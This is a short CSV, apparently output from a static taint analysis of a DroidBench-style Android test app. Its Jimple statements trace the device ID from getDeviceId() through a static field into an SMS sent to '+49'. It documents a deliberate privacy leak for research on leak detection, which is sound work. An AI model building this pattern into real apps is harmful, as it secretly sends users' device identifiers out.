,method,stmtLineNumber,stmt
0,<de.ecspride.Activity2: void onCreate(android.os.Bundle)>,-1,$r4 = virtualinvoke r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
1,<de.ecspride.Activity2: void onCreate(android.os.Bundle)>,-1,<de.ecspride.Activity1: java.lang.String data1> = $r4
2,<de.ecspride.Activity2: void onCreate(android.os.Bundle)>,-1,return
3,<dummyMainClass: de.ecspride.Activity2 dummyMainMethod_de_ecspride_Activity2(android.content.Intent)>,-1,return $r0
4,<dummyMainClass: void dummyMainMethod(java.lang.String[])>,-1,staticinvoke <dummyMainClass: de.ecspride.Activity1 dummyMainMethod_de_ecspride_Activity1(android.content.Intent)>(null)
5,<dummyMainClass: de.ecspride.Activity1 dummyMainMethod_de_ecspride_Activity1(android.content.Intent)>,-1,virtualinvoke $r0.<de.ecspride.Activity1: void onCreate(android.os.Bundle)>(null)
6,<de.ecspride.Activity1: void onCreate(android.os.Bundle)>,-1,$r2 = <de.ecspride.Activity1: java.lang.String data1>
7,<de.ecspride.Activity1: void onCreate(android.os.Bundle)>,-1,"virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49"", null, $r2, null, null)"
